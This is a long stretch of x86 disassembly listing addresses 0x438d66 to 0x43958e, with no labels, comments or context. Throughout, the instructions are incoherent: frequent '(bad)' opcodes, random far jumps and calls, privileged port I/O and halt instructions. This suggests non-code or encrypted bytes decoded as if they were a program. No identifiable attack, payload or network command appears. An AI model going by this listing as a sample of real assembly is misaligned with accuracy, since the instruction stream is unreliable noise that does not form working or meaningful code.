  438d66:	push   ebx
  438d67:	jle    0x438daf
  438d69:	(bad)  
  438d6a:	xchg   edx,eax
  438d6b:	(bad)  
  438d6c:	jne    0x438deb
  438d6e:	xchg   esp,eax
  438d6f:	aam    0xb
  438d71:	pop    ds
  438d72:	jmp    0xed2:0xa902e7fd
  438d79:	sti    
  438d7a:	push   0xe8144564
  438d7f:	or     al,0x16
  438d81:	jb     0x438d1c
  438d83:	jmp    0x4975:0x42c6b194
  438d8a:	fwait
  438d8b:	inc    edx
  438d8c:	nop
  438d8d:	push   ss
  438d8e:	repnz fs push esp
  438d91:	mov    cl,0x76
  438d93:	xor    BYTE PTR [eax+0x49f88447],al
  438d99:	sub    eax,0xd78a98a4
  438d9e:	es xor DWORD PTR es:[edi+0xac06e3a],esp
  438da6:	pusha  
  438da7:	adc    al,0xa2
  438da9:	jbe    0x438d83
  438dab:	xlat   BYTE PTR ds:[ebx]
  438dac:	push   edx
  438dad:	adc    eax,0x7c4a8a05
  438db2:	in     eax,dx
  438db3:	mov    ss,WORD PTR [eax-0x5a73e983]
  438db9:	add    eax,0x884102
  438dbe:	mov    BYTE PTR [ebp+eax*4-0x13],bl
  438dc2:	sar    al,cl
  438dc4:	mov    al,0x7e
  438dc6:	cs call 0x32d3e67b
  438dcc:	aad    0x36
  438dce:	call   0xacdb:0xac8c1aae
  438dd5:	gs mov dh,0xa2
  438dd8:	dec    edi
  438dd9:	dec    ebx
  438dda:	push   0x103620e6
  438ddf:	sub    ecx,DWORD PTR [esi-0x57ebe9ce]
  438de5:	test   al,0xd2
  438de7:	add    esi,DWORD PTR [esi]
  438de9:	sbb    eax,ecx
  438deb:	jecxz  0x438d7e
  438ded:	adc    edi,0x3e276672
  438df3:	je     0x438d78
  438df5:	ds dec edx
  438df7:	clc    
  438df8:	pusha  
  438df9:	out    0x81,al
  438dfb:	pusha  
  438dfc:	inc    eax
  438dfd:	loope  0x438dd9
  438dff:	mov    esp,0x58c1b016
  438e04:	or     BYTE PTR [eax+0x33b6b48d],al
  438e0a:	pop    es
  438e0b:	pop    ecx
  438e0c:	mov    edi,0x10c42a0d
  438e11:	js     0x438e14
  438e13:	pop    es
  438e14:	test   al,0x86
  438e16:	nop
  438e17:	mov    WORD PTR ds:0x8d512ef0,?
  438e1d:	cmp    bl,dh
  438e1f:	xor    eax,0x60223809
  438e24:	fild   DWORD PTR [ecx]
  438e26:	mov    DWORD PTR [esp+edi*4],edi
  438e29:	fistp  DWORD PTR [eax+0x2a]
  438e2c:	or     al,0x76
  438e2e:	mov    esp,0xb2a35bc6
  438e33:	xlat   BYTE PTR ds:[ebx]
  438e34:	mov    ds,WORD PTR [ebx+0x0]
  438e37:	cmp    DWORD PTR [ebx-0x7a],ebp
  438e3a:	jo     0x438dec
  438e3c:	add    eax,0x3e012e1b
  438e41:	push   edi
  438e42:	push   cs
  438e43:	call   0xbd9:0x213bc0a8
  438e4a:	inc    eax
  438e4b:	push   ds
  438e4c:	clc    
  438e4d:	adc    eax,ebp
  438e4f:	shl    BYTE PTR [eax-0x595555f7],0xc
  438e56:	mov    al,ds:0xb0e688b7
  438e5b:	inc    ecx
  438e5c:	and    al,0xaa
  438e5e:	push   es
  438e5f:	fs (bad) 
  438e61:	in     al,dx
  438e62:	mov    eax,0xd0c49a4a
  438e67:	add    ebp,DWORD PTR [esi]
  438e69:	mov    ds:0xbdf407c,al
  438e6e:	mov    ebx,0xc81c004c
  438e73:	inc    ebp
  438e74:	pop    esp
  438e75:	push   ss
  438e76:	xor    al,0xb4
  438e78:	sub    esi,DWORD PTR [edx]
  438e7a:	dec    edi
  438e7b:	mov    eax,0x66eaa405
  438e80:	stos   DWORD PTR es:[edi],eax
  438e81:	pop    DWORD PTR [esi-0x16]
  438e84:	fadd   DWORD PTR [eax]
  438e86:	pop    esi
  438e87:	dec    esi
  438e88:	inc    esp
  438e89:	mov    ds:0x48433362,al
  438e8e:	and    ch,BYTE PTR [eax+eiz*4-0x2a]
  438e92:	fwait
  438e93:	push   ecx
  438e94:	pop    edx
  438e95:	lock add BYTE PTR [ecx+eiz*4+0x6],ch
  438e9a:	xchg   DWORD PTR [eax-0x127e7a1d],eax
  438ea0:	push   ds
  438ea1:	mov    dh,0x70
  438ea3:	out    0x62,al
  438ea5:	add    al,0x44
  438ea7:	hlt    
  438ea8:	es push ds
  438eaa:	sbb    al,bl
  438eac:	popf   
  438ead:	imul   ebx,edi,0xffffff90
  438eb0:	and    eax,0xb5000e49
  438eb5:	nop    DWORD PTR [ecx-0x61]
  438eb9:	(bad)  
  438eba:	cmp    al,0xc8
  438ebc:	push   ebp
  438ebd:	push   ss
  438ebe:	cmp    eax,0xbe84ab49
  438ec3:	(bad)  
  438ec4:	out    dx,al
  438ec5:	pusha  
  438ec6:	xchg   edx,eax
  438ec7:	gs cdq 
  438ec9:	or     DWORD PTR [edx+edi*2],ebp
  438ecc:	add    BYTE PTR [edx],bh
  438ece:	mov    esp,0xdcf9e91a
  438ed3:	sbb    edi,DWORD PTR ds:[eax-0x18]
  438ed7:	push   esi
  438ed8:	and    bh,BYTE PTR [esi]
  438eda:	cli    
  438edb:	mov    ds:0x25004ba6,al
  438ee0:	out    0x92,al
  438ee2:	rcl    ah,1
  438ee4:	sahf   
  438ee5:	inc    esi
  438ee6:	pop    ebx
  438ee7:	jle    0x438f0b
  438ee9:	ins    BYTE PTR es:[edi],dx
  438eea:	loopne 0x438efd
  438eec:	rcl    BYTE PTR [ebp+0x68e33444],cl
  438ef2:	adc    eax,0x124ac202
  438ef7:	xor    al,0x6f
  438ef9:	dec    esp
  438efa:	js     0x438f2a
  438efc:	scas   al,BYTE PTR es:[edi]
  438efd:	popa   
  438efe:	lods   eax,DWORD PTR ds:[esi]
  438eff:	and    ah,BYTE PTR [edi+0x63]
  438f02:	cld    
  438f03:	xchg   ecx,eax
  438f04:	and    dh,BYTE PTR [ecx+0x2a]
  438f07:	mov    dl,0xf
  438f09:	mov    al,0xfa
  438f0b:	add    esi,DWORD PTR [ebp+0x3a]
  438f0e:	aam    0xd0
  438f10:	nop
  438f11:	push   ds
  438f12:	inc    eax
  438f13:	sub    eax,0xe5e94b6
  438f18:	cmp    al,0xc
  438f1a:	sbb    al,0x18
  438f1c:	stos   BYTE PTR es:[edi],al
  438f1d:	lods   al,BYTE PTR ds:[esi]
  438f1e:	sbb    eax,0xa840ecec
  438f23:	xor    eax,0x523ab229
  438f28:	pop    esi
  438f29:	scas   al,BYTE PTR es:[edi]
  438f2a:	add    al,0x34
  438f2c:	fisubr WORD PTR es:[edx-0x7f64ff2c]
  438f33:	adc    ch,BYTE PTR [edx+0x52]
  438f36:	mov    gs,WORD PTR [edi+0xdd7782]
  438f3c:	xchg   esi,eax
  438f3d:	mov    ecx,0x89af68d2
  438f42:	sub    bl,BYTE PTR [ecx]
  438f44:	je     0x438f7c
  438f46:	sbb    al,0xcb
  438f48:	pop    esi
  438f49:	adc    BYTE PTR [esi+0x391a0367],dh
  438f4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438f50:	push   es
  438f51:	jns    0x438f55
  438f53:	push   ecx
  438f54:	mov    al,BYTE PTR [edi]
  438f56:	in     al,dx
  438f57:	fstp   QWORD PTR [edx-0x72]
  438f5a:	mov    ecx,cs
  438f5c:	cmp    al,BYTE PTR [eax-0x7d57b780]
  438f62:	pop    edx
  438f63:	jnp    0x438f91
  438f65:	push   ebp
  438f66:	out    dx,al
  438f67:	sub    DWORD PTR [esi],esi
  438f69:	ror    DWORD PTR [eax+ebx*2-0x134c3bb1],0xb2
  438f71:	xlat   BYTE PTR ds:[ebx]
  438f72:	mov    al,ds:0x768da20a
  438f77:	or     dl,bh
  438f79:	fwait
  438f7a:	outs   dx,DWORD PTR ds:[esi]
  438f7b:	pop    ebx
  438f7c:	aas    
  438f7d:	gs ins BYTE PTR es:[edi],dx
  438f7f:	or     dl,BYTE PTR [edx+eiz*2]
  438f82:	and    ecx,DWORD PTR [edi+ecx*8-0x57b1263e]
  438f89:	dec    edi
  438f8a:	xchg   DWORD PTR [esi],ebx
  438f8c:	adc    BYTE PTR [ebx+0x3c14c28a],bl
  438f92:	lods   al,BYTE PTR ds:[esi]
  438f93:	inc    ecx
  438f94:	rcr    BYTE PTR [eax+0x4c03d901],0x28
  438f9b:	jg     0x438fdd
  438f9d:	add    al,0x56
  438f9f:	sub    BYTE PTR [ecx],cl
  438fa1:	adc    eax,0x1074cce4
  438fa6:	popa   
  438fa7:	xchg   esi,eax
  438fa8:	adc    bl,BYTE PTR [eax-0x29]
  438fab:	mov    ds:0x10c48ad2,al
  438fb0:	pop    ebp
  438fb1:	test   BYTE PTR [ecx-0x6e],al
  438fb4:	mov    dh,0xe3
  438fb6:	imul   esp,DWORD PTR [ebx+0x187ae0a1],0xa5d4cad2
  438fc0:	inc    ebp
  438fc1:	pop    esp
  438fc2:	sbb    eax,DWORD PTR [eax+0x74]
  438fc5:	(bad)  
  438fc6:	sub    BYTE PTR [ecx-0x60],al
  438fc9:	add    BYTE PTR [ecx+0x586c4de9],ch
  438fcf:	mov    dl,0x1
  438fd1:	add    BYTE PTR [esi+0x40a2ab94],al
  438fd7:	ins    BYTE PTR es:[edi],dx
  438fd8:	dec    eax
  438fd9:	xor    al,0xce
  438fdb:	test   al,0x6f
  438fdd:	mov    DWORD PTR [ebp-0x6375933d],ebp
  438fe3:	cmp    ebx,DWORD PTR [edi*1-0x3bfa94dd]
  438fea:	mov    cl,0x2e
  438fec:	repz mov bl,BYTE PTR [ebx-0x718979a2]
  438ff3:	or     dh,BYTE PTR [edi]
  438ff5:	and    DWORD PTR [edx+eiz*8-0xec8dbe5],eax
  438ffc:	xchg   ecx,eax
  438ffd:	aam    0xaa
  438fff:	xor    esp,DWORD PTR [esi-0x55d51453]
  439005:	mov    ds:0x8b46e86b,al
  43900a:	mov    WORD PTR [ebx-0x1a],?
  43900d:	jle    0x438f9f
  43900f:	or     ah,0x80
  439012:	stc    
  439013:	jae    0x439084
  439015:	add    BYTE PTR [ebp+0x7c1810c3],bl
  43901b:	push   ecx
  43901c:	sub    BYTE PTR [eax-0x30],cl
  43901f:	into   
  439020:	sbb    al,BYTE PTR [eax]
  439022:	adc    DWORD PTR [ebp+0x42],ebx
  439025:	jmp    0x43901d
  439027:	and    al,0x10
  439029:	je     0x43904f
  43902b:	stc    
  43902c:	jmp    0x349346b2
  439031:	dec    edx
  439032:	adc    BYTE PTR [edx+eax*4],dh
  439035:	ror    BYTE PTR ds:0x7aca7d74,0x24
  43903c:	ret    0xd797
  43903f:	ds inc esi
  439041:	dec    ebp
  439042:	cld    
  439043:	and    dh,BYTE PTR [ebp+0x4e3f1ca0]
  439049:	ja     0x438fd7
  43904b:	mov    ch,0xf
  43904d:	dec    eax
  43904e:	aas    
  43904f:	xchg   edx,eax
  439050:	leave  
  439051:	inc    ebp
  439052:	adc    BYTE PTR [ebx+0x29fec22],ah
  439058:	cmp    ah,BYTE PTR [ecx+0x36]
  43905b:	dec    edx
  43905c:	fidiv  WORD PTR [edi+0x6f590215]
  439062:	dec    esp
  439063:	mov    edi,0xc43a0024
  439068:	hlt    
  439069:	repnz les eax,FWORD PTR [eax]
  43906c:	mov    cs,WORD PTR [eax+0x12d18026]
  439072:	ins    BYTE PTR es:[edi],dx
  439073:	jl     0x439087
  439075:	fsubr  st,st(6)
  439077:	mov    al,ds:0xde49ecb7
  43907c:	mov    cl,0xca
  43907e:	sub    al,BYTE PTR [edx+0x55428ad]
  439084:	adc    eax,esi
  439086:	cmp    al,BYTE PTR [eax]
  439088:	push   0x515e0049
  43908d:	push   0xbcd3cc7a
  439092:	mov    ds:0x4819f0ed,al
  439097:	xor    DWORD PTR [edx],edi
  439099:	arpl   bx,ax
  43909b:	lods   al,BYTE PTR ds:[esi]
  43909c:	retf   0xaa94
  43909f:	or     ch,BYTE PTR [ebx+eax*4+0x7c]
  4390a3:	mov    WORD PTR [edi],?
  4390a5:	mov    ebp,0xcdb4e10
  4390aa:	lock popw ds
  4390ad:	push   0xffffff8b
  4390af:	push   eax
  4390b0:	popa   
  4390b1:	adc    eax,0x74baa058
  4390b6:	mov    eax,ds:0x1059e800
  4390bb:	lods   eax,DWORD PTR ds:[esi]
  4390bc:	push   0x70ed27ea
  4390c1:	pop    edx
  4390c2:	cs das 
  4390c4:	addr16 out 0xa,al
  4390c7:	push   0xffffffa8
  4390c9:	sub    ah,ah
  4390cb:	dec    ebp
  4390cc:	out    dx,al
  4390cd:	sahf   
  4390ce:	ret    0xd564
  4390d1:	xor    eax,0xdd9e7400
  4390d6:	bound  edx,QWORD PTR [ebp+0x2a]
  4390d9:	lods   eax,DWORD PTR ds:[esi]
  4390da:	sar    BYTE PTR [ebx+edx*2+0x10],0x46
  4390df:	mov    cl,0x4b
  4390e1:	add    BYTE PTR [ebx+eax*4],ch
  4390e4:	add    BYTE PTR [ebx-0x55d76bde],al
  4390ea:	pusha  
  4390eb:	imul   edx,DWORD PTR [esi],0xffffffe1
  4390ee:	pop    esi
  4390ef:	add    eax,0x35a178bb
  4390f4:	add    eax,0x88736121
  4390f9:	mov    al,cs:0xad5ac8a0
  4390ff:	mov    cs,WORD PTR [ecx]
  439101:	and    bh,al
  439103:	or     DWORD PTR [esi+0x5c],0xb1b47b60
  43910a:	mov    bh,ch
  43910c:	xchg   al,bl
  43910e:	es inc esi
  439110:	sbb    esp,edx
  439112:	adc    dh,BYTE PTR [eax-0x7f]
  439115:	adc    BYTE PTR [eax+0x1e],dh
  439118:	idiv   eax
  43911a:	add    DWORD PTR [eax+0x648aec7c],esp
  439120:	mov    bl,0xd9
  439122:	int3   
  439123:	push   es
  439124:	add    BYTE PTR [ebx],cl
  439126:	sbb    eax,0x5f179a16
  43912b:	ds cld 
  43912d:	je     0x43914f
  43912f:	rcr    BYTE PTR [esi],1
  439131:	mov    eax,0x7ac4c70
  439136:	push   ebp
  439137:	loopne 0x439180
  439139:	or     edi,DWORD PTR [edi]
  43913b:	or     BYTE PTR [edx-0x3fc7c7c4],al
  439141:	adc    dl,al
  439143:	mov    ch,BYTE PTR [esi-0x455c072a]
  439149:	mov    ebx,DWORD PTR [edx+0x43]
  43914c:	imul   edi,DWORD PTR [esi+eax*2],0xffffffca
  439150:	sub    DWORD PTR [esi-0x47],edx
  439153:	push   ss
  439154:	jo     0x439154
  439156:	(bad)  
  439157:	xor    dh,BYTE PTR [esi-0x4c]
  43915a:	addr16 adc ch,dh
  43915d:	mov    edi,DWORD PTR [edx]
  43915f:	rep ins BYTE PTR es:[edi],dx
  439161:	stc    
  439162:	aas    
  439163:	sub    eax,0xc6928fb0
  439168:	fisubr WORD PTR [ebx+0x60ca783a]
  43916e:	pop    ebp
  43916f:	inc    ecx
  439170:	aas    
  439171:	inc    ebp
  439172:	cmp    al,0x6e
  439174:	fucomip st,st(0)
  439176:	sub    eax,0xffffff91
  439179:	mov    al,ds:0x5ac1e606
  43917e:	and    BYTE PTR [edx],bh
  439180:	inc    esi
  439181:	and    ebp,esi
  439183:	or     BYTE PTR [eax-0x16513956],al
  439189:	xor    DWORD PTR [ecx-0x2497a1b9],eax
  43918f:	inc    esi
  439190:	pushf  
  439191:	test   DWORD PTR [edx+0x7],ebx
  439194:	jo     0x43919e
  439196:	enter  0xb6f0,0xaa
  43919a:	sub    BYTE PTR [eax],dh
  43919c:	int    0x16
  43919e:	fst    QWORD PTR [edi]
  4391a0:	adc    dl,ch
  4391a2:	(bad)  
  4391a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4391a4:	rcr    DWORD PTR [edi-0x7cab5924],1
  4391aa:	mov    ebp,0xb2f1b04a
  4391af:	cmp    al,dh
  4391b1:	add    ah,bh
  4391b3:	push   ebx
  4391b4:	sar    BYTE PTR [edx+0x16],1
  4391b7:	mov    dh,0x23
  4391b9:	imul   ebx,DWORD PTR [eax+0x28f44494],0xa9f6df7d
  4391c3:	xchg   BYTE PTR [edi+0x1a3936a4],cl
  4391c9:	pop    ebx
  4391ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4391cb:	push   edx
  4391cc:	mov    eax,0xd9b095c6
  4391d1:	je     0x4391a0
  4391d3:	lods   al,BYTE PTR ds:[esi]
  4391d4:	pop    esi
  4391d5:	and    al,0xaa
  4391d7:	mov    esi,0x9695439c
  4391dc:	enter  0xea62,0x5
  4391e0:	add    eax,0x2663d4bc
  4391e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4391e6:	popf   
  4391e7:	dec    edx
  4391e8:	jmp    0xc00e:0x340c2bd3
  4391ef:	xor    BYTE PTR [eax-0x32de4ede],dl
  4391f5:	fiadd  DWORD PTR [ebx]
  4391f7:	jmp    0x4391f9
  4391f9:	or     edx,DWORD PTR [ebp+0x6afa9be8]
  4391ff:	call   FWORD PTR [esi+ebp*8]
  439202:	mov    ah,dl
  439204:	rol    DWORD PTR [edx-0xd],cl
  439207:	add    al,BYTE PTR [eax]
  439209:	sub    DWORD PTR [ecx-0x5c96218d],edi
  43920f:	push   ebp
  439210:	dec    edx
  439211:	lods   eax,DWORD PTR ds:[esi]
  439212:	add    al,0x4e
  439214:	jl     0x439267
  439216:	mov    esp,0x8700887b
  43921b:	and    ebx,edi
  43921d:	fs (bad) 
  43921f:	cmp    eax,0xc0f88ec8
  439224:	mov    ds:0x9c574706,al
  439229:	stos   BYTE PTR es:[edi],al
  43922a:	ja     0x439246
  43922c:	inc    eax
  43922d:	xadd   DWORD PTR [edx+eiz*8],ecx
  439231:	xchg   ebx,eax
  439232:	pop    esp
  439233:	mov    ecx,0xd5907c96
  439238:	inc    ebp
  439239:	clc    
  43923a:	aam    0x78
  43923c:	xchg   ebx,eax
  43923d:	xor    esp,DWORD PTR [esi-0x69dec1e0]
  439243:	fdiv   DWORD PTR [esi-0x60]
  439246:	mov    al,ds:0xdf98458
  43924b:	mov    ah,0x0
  43924d:	rol    DWORD PTR [ebx+0x237872],cl
  439253:	clc    
  439254:	dec    ecx
  439255:	(bad)  
  439256:	outs   dx,DWORD PTR ds:[esi]
  439257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439258:	data16 add al,0xcd
  43925b:	and    dl,bl
  43925d:	jns    0x439206
  43925f:	adc    dh,ah
  439261:	pop    ss
  439262:	sbb    esp,0x1e
  439265:	out    0x68,al
  439267:	pop    ebp
  439268:	es (bad) 
  43926a:	mov    esi,DWORD PTR [edx+0x69c4ea9c]
  439270:	sub    BYTE PTR [ebp-0x27],ah
  439273:	mov    ebp,0xe9961cca
  439278:	xchg   edi,eax
  439279:	es stos BYTE PTR es:[edi],al
  43927b:	dec    ch
  43927d:	adc    ch,ah
  43927f:	cmp    eax,0x3c417600
  439284:	mov    DWORD PTR [edx-0x28],esp
  439287:	inc    ecx
  439288:	jl     0x439235
  43928a:	cmp    eax,0x9fd058d2
  43928f:	iret   
  439290:	add    al,0x41
  439292:	retf   0x28e
  439295:	sbb    ecx,esp
  439297:	(bad)  
  439298:	loopne 0x4392b4
  43929a:	fidivr DWORD PTR [edx+ecx*4-0x70]
  43929e:	ss mov ah,0x47
  4392a1:	les    ecx,FWORD PTR [esp+ebx*1+0x2f25146e]
  4392a8:	inc    eax
  4392a9:	mov    al,0x45
  4392ab:	lahf   
  4392ac:	loopne 0x43927a
  4392ae:	enter  0xe4f2,0xbe
  4392b2:	sub    bh,BYTE PTR [esi-0xc678bd8]
  4392b8:	push   cs
  4392b9:	loopne 0x4392e3
  4392bb:	pop    edx
  4392bc:	gs cmp eax,0xf07a80dc
  4392c2:	or     DWORD PTR [ecx],ecx
  4392c4:	sub    DWORD PTR [ecx-0x369d8dd6],ebx
  4392ca:	or     BYTE PTR [eax+0x2084fed4],bl
  4392d0:	add    BYTE PTR [esi],0xb
  4392d3:	and    bh,BYTE PTR [edx+0x7a3a197e]
  4392d9:	mov    al,ds:0xe8065c3f
  4392de:	mov    ds:0x827a28f6,al
  4392e3:	aad    0x46
  4392e5:	mov    ebx,0x71507fa2
  4392ea:	or     BYTE PTR ds:0xf018ec40,bl
  4392f0:	leave  
  4392f1:	jle    0x439275
  4392f3:	test   al,0xb2
  4392f5:	rcr    DWORD PTR [esi+0x2c],1
  4392f8:	adc    bl,BYTE PTR [ecx+0x7e203a2a]
  4392fe:	adc    al,0xbf
  439300:	add    al,0xc
  439302:	fistp  DWORD PTR [esi+0x408f5a9b]
  439308:	sub    al,0xbc
  43930a:	mov    DWORD PTR [eax-0x64],edx
  43930d:	stos   BYTE PTR es:[edi],al
  43930e:	or     dh,BYTE PTR [ecx+ebx*4]
  439311:	fisubr DWORD PTR [ebx-0x54]
  439314:	out    dx,al
  439315:	adc    DWORD PTR [ecx+ebx*1+0x1255ee04],0x50362217
  439320:	les    ebx,FWORD PTR [eax]
  439322:	jo     0x439302
  439324:	inc    ecx
  439325:	das    
  439326:	inc    ecx
  439327:	push   ebp
  439328:	aam    0xca
  43932a:	sahf   
  43932b:	(bad)  
  43932c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43932d:	test   al,0x45
  43932f:	mov    ah,0x6b
  439331:	or     BYTE PTR ds:0x1d880352,dh
  439337:	inc    esi
  439338:	test   al,0x55
  43933a:	or     cl,BYTE PTR [eax]
  43933c:	loop   0x43939f
  43933e:	fdivr  DWORD PTR fs:[eax+0x6a991342]
  439345:	pop    esi
  439346:	xchg   ebx,eax
  439347:	jp     0x439307
  439349:	jmp    0x4c566850
  43934e:	inc    esp
  43934f:	clc    
  439350:	mov    al,ds:0x38509b4
  439355:	mov    fs,esi
  439357:	xor    dh,BYTE PTR [esi+0x27]
  43935a:	in     eax,dx
  43935b:	dec    ebx
  43935c:	push   0x490ab5d1
  439361:	mov    WORD PTR [eax+0xf],?
  439364:	test   al,0x47
  439366:	add    dl,al
  439368:	mov    dh,0xc5
  43936a:	loop   0x43936a
  43936c:	jo     0x439372
  43936e:	test   BYTE PTR [esi-0x7d67b60f],dh
  439374:	pop    ebp
  439375:	in     al,dx
  439376:	sbb    ebx,edx
  439378:	mov    ds:0xb523852d,al
  43937d:	dec    ebx
  43937e:	ret    0x138
  439381:	jecxz  0x4393df
  439383:	sub    BYTE PTR [ebx+ecx*2],bh
  439386:	cmp    eax,DWORD PTR [esi+0x135c103a]
  43938c:	mov    ds:0x3e8aa6df,al
  439391:	fadd   QWORD PTR [eax]
  439393:	mov    esi,0xef553e52
  439398:	sub    BYTE PTR [eax-0x6c],ch
  43939b:	sbb    BYTE PTR [eax],bl
  43939d:	std    
  43939e:	lock push eax
  4393a0:	rol    BYTE PTR [eax],cl
  4393a2:	ins    DWORD PTR es:[edi],dx
  4393a3:	mov    ds:0x4038681,al
  4393a8:	ins    BYTE PTR es:[edi],dx
  4393a9:	retf   0x8ba2
  4393ac:	into   
  4393ad:	push   0x42
  4393af:	imul   ebp,DWORD PTR [ebx],0x54
  4393b2:	lock jl 0x43937b
  4393b5:	leave  
  4393b6:	lods   al,BYTE PTR ds:[esi]
  4393b7:	iret   
  4393b8:	mov    eax,0xeb0c49cd
  4393bd:	push   ebx
  4393be:	mov    dh,0x7b
  4393c0:	ds push 0x1d
  4393c3:	push   esi
  4393c4:	add    al,0x96
  4393c6:	ins    BYTE PTR es:[edi],dx
  4393c7:	jo     0x43934d
  4393c9:	cmc    
  4393ca:	retf   0x1efe
  4393cd:	dec    eax
  4393ce:	adc    al,0x0
  4393d0:	mov    esp,0x7ea5f4c7
  4393d5:	sbb    dl,0xaa
  4393d8:	fmul   DWORD PTR [edx+edi*1]
  4393db:	(bad)  [edi+0x6dee423c]
  4393e1:	inc    ebp
  4393e2:	pop    DWORD PTR [esi]
  4393e4:	mov    dh,BYTE PTR [ebx+0x26]
  4393e7:	enter  0x84dc,0x75
  4393eb:	or     eax,0x1638ca7d
  4393f0:	(bad)  
  4393f1:	xor    BYTE PTR [esi+0x9],dl
  4393f4:	mov    bl,0x49
  4393f6:	cwde   
  4393f7:	jl     0x43937c
  4393f9:	adc    al,0x3c
  4393fb:	sub    BYTE PTR [edx-0x192a4b5f],al
  439401:	or     DWORD PTR [eax],eax
  439403:	sub    DWORD PTR [eax-0x313e0808],esi
  439409:	mov    esi,0xe32871d0
  43940e:	adc    eax,0x632546b
  439413:	ja     0x43945d
  439415:	lock dec edx
  439417:	fcmove st,st(0)
  439419:	cwde   
  43941a:	scas   al,BYTE PTR es:[edi]
  43941b:	int3   
  43941c:	mov    esp,0xad88e431
  439421:	shr    BYTE PTR [ecx+0x3c],0x1e
  439425:	dec    edi
  439426:	les    ebx,FWORD PTR [edx-0x53]
  439429:	test   BYTE PTR [esi],bl
  43942b:	push   edx
  43942c:	clc    
  43942d:	hlt    
  43942e:	std    
  43942f:	xchg   ecx,eax
  439430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439431:	mov    esp,0x19556856
  439436:	xlat   BYTE PTR ds:[ebx]
  439437:	retf   0x7abb
  43943a:	xor    DWORD PTR [eax],0xeefa40f5
  439440:	lds    eax,FWORD PTR [ebp-0x76]
  439443:	fwait
  439444:	sahf   
  439445:	xchg   edx,eax
  439446:	adc    eax,0xa622b898
  43944b:	sbb    BYTE PTR [eax-0x69b46bcc],0x8a
  439452:	mov    dh,0xa8
  439454:	or     al,0x38
  439456:	test   eax,0x4681c882
  43945b:	mov    ds:0x9dad8f,al
  439460:	fsub   QWORD PTR [ebp+0x6f5a7c7d]
  439466:	fcmovnb st,st(2)
  439468:	inc    edi
  439469:	pop    ecx
  43946a:	and    al,BYTE PTR [ebp-0x79949722]
  439470:	in     eax,dx
  439471:	ret    0x7614
  439474:	leave  
  439475:	pop    esi
  439476:	jp     0x4394be
  439478:	mov    ds:0x58e39394,al
  43947d:	push   eax
  43947e:	icebp  
  43947f:	sub    al,0x18
  439481:	pop    esp
  439482:	call   0x889:0xce21ccb1
  439489:	pop    esp
  43948a:	adc    BYTE PTR [esi-0x15],ch
  43948d:	sub    dl,BYTE PTR [edi]
  43948f:	test   al,0x55
  439491:	outs   dx,BYTE PTR ds:[esi]
  439492:	mov    bl,BYTE PTR [esi]
  439494:	xchg   BYTE PTR [edx+0x61f05b4a],cl
  43949a:	call   0x9b35ef0d
  43949f:	test   BYTE PTR [ecx+0x80dca93],bl
  4394a5:	fisub  DWORD PTR [edx]
  4394a7:	xchg   edx,eax
  4394a8:	hlt    
  4394a9:	lock sbb al,0x55
  4394ac:	data16 jne 0x43952b
  4394af:	adc    BYTE PTR [edx],ch
  4394b1:	xor    ah,BYTE PTR [ebp-0x70]
  4394b4:	scas   al,BYTE PTR es:[edi]
  4394b5:	push   esp
  4394b6:	sbb    BYTE PTR [ebp-0x5fdb7146],dh
  4394bc:	mov    dl,0x16
  4394be:	sbb    BYTE PTR [edi-0x1a],0xed
  4394c2:	mov    ds:0xd00152c2,al
  4394c7:	dec    ebx
  4394c8:	ret    0xc697
  4394cb:	inc    edx
  4394cc:	push   ebx
  4394cd:	or     edx,DWORD PTR [eax]
  4394cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4394d0:	mov    bl,0x27
  4394d2:	ret    
  4394d3:	fs jmp 0x4394b1
  4394d6:	dec    eax
  4394d7:	jnp    0x4394df
  4394d9:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4394db:	mov    DWORD PTR [esi+0x6edec390],esp
  4394e1:	mov    dl,0x12
  4394e3:	(bad)  
  4394e4:	mov    eax,ds:0xf2c6af82
  4394e9:	and    dh,BYTE PTR [edi+eax*8-0x18]
  4394ed:	push   edx
  4394ee:	(bad)  
  4394ef:	imul   ecx,esp,0x32
  4394f2:	jmp    0x83e46203
  4394f7:	lods   eax,DWORD PTR ds:[esi]
  4394f8:	cs test al,0xa4
  4394fb:	jmp    0xc054b312
  439500:	das    
  439501:	cli    
  439502:	mov    edi,0xf96ae890
  439507:	adc    eax,0xac26bfb4
  43950c:	rol    ebx,1
  43950e:	add    BYTE PTR [ebp-0x16],bl
  439511:	inc    esi
  439512:	mov    edi,0x13dedd2
  439517:	scas   eax,DWORD PTR es:[edi]
  439518:	add    BYTE PTR [esi+0x3fa280a3],al
  43951e:	cld    
  43951f:	mov    dh,0xb0
  439521:	test   al,0x58
  439523:	call   0x368c:0x503e8eda
  43952a:	pop    ebx
  43952b:	push   eax
  43952c:	lock add BYTE PTR [edx],cl
  43952f:	sbb    BYTE PTR [esi],0x90
  439532:	inc    edx
  439533:	mov    edx,0x56c82a2
  439538:	pop    ss
  439539:	inc    edx
  43953a:	pushf  
  43953b:	adc    al,0xfd
  43953d:	int3   
  43953e:	push   edx
  43953f:	cmp    bh,BYTE PTR [edi]
  439541:	sbb    BYTE PTR [ebx+ecx*4],bh
  439544:	jp     0x4395ae
  439546:	jb     0x4394d3
  439548:	mov    bh,0x88
  43954a:	ss jge 0x43957d
  43954d:	mov    esi,0xee193c15
  439552:	inc    esp
  439553:	add    BYTE PTR [bx+si+0x1a],bl
  439557:	sbb    al,0x51
  439559:	push   esp
  43955a:	ficom  WORD PTR [edi+ebp*4]
  43955d:	sub    DWORD PTR [edx+0x46ace536],edi
  439563:	xor    bh,BYTE PTR [edi+0x0]
  439566:	mov    ch,0x57
  439568:	mov    al,0xe
  43956a:	sbb    cl,BYTE PTR [edx-0x2e]
  43956d:	inc    si
  43956f:	ficomp DWORD PTR [eax+eax*4+0x66058827]
  439576:	jno    0x4395be
  439578:	repz inc eax
  43957a:	push   ebx
  43957b:	or     DWORD PTR [ecx],0xfaf74252
  439581:	mov    dl,0x28
  439583:	mov    ah,0xdc
  439585:	sub    bh,dl
  439587:	push   ss
  439588:	push   ds
  439589:	xor    al,dl
  43958b:	cmp    BYTE PTR [ecx+0x7d],cl
  43958e:	dec    eax
